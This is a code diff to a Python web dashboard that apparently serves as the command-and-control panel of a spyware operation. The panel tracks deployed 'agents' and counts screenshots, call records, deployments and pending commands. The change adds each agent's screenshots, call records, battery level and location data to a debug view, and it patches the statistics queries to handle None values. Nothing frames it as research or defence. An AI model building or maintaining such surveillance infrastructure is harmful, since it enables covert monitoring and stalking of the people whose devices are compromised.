@@ -202,6 +202,10 @@ def debug_agents():
             <strong>User Agent:</strong> {user_agent}<br>
             <strong>Last Seen:</strong> {agent_dict['last_seen']}<br>
             <strong>First Seen:</strong> {agent_dict['first_seen']}<br>
+            <strong>Screenshot Count:</strong> {agent_dict['screenshot_count']}<br>
+            <strong>Call Records:</strong> {agent_dict['call_records']}<br>
+            <strong>Battery Level:</strong> {agent_dict['battery_level']}<br>
+            <strong>Location Data:</strong> {agent_dict['location_data']}<br>
         </div>
         """
     
@@ -251,12 +255,12 @@ def dashboard():
     with db_lock:
         conn = get_db_connection()
         
-        # Get statistics
+        # Get statistics - FIXED: Handle None values
         stats = {
-            'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0],
-            'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0],
-            'total_calls': conn.execute("SELECT COUNT(*) FROM call_records").fetchone()[0],
-            'total_deployments': conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0]
+            'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0] or 0,
+            'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0] or 0,
+            'total_calls': conn.execute("SELECT COUNT(*) FROM call_records").fetchone()[0] or 0,
+            'total_deployments': conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0] or 0
         }
         
         # Get recent data - Convert rows to dictionaries
@@ -291,13 +295,13 @@ def admin_dashboard():
     with db_lock:
         conn = get_db_connection()
         
-        # Get comprehensive statistics
+        # Get comprehensive statistics - FIXED: Handle None values
         stats = {
-            'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0],
-            'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0],
-            'total_calls': conn.execute("SELECT COUNT(*) FROM call_records").fetchone()[0],
-            'total_deployments': conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0],
-            'pending_commands': conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'").fetchone()[0]
+            'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0] or 0,
+            'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0] or 0,
+            'total_calls': conn.execute("SELECT COUNT(*) FROM call_records").fetchone()[0] or 0,
+            'total_deployments': conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0] or 0,
+            'pending_commands': conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'").fetchone()[0] or 0
         }
         
         # Get recent data - Convert rows to dictionaries
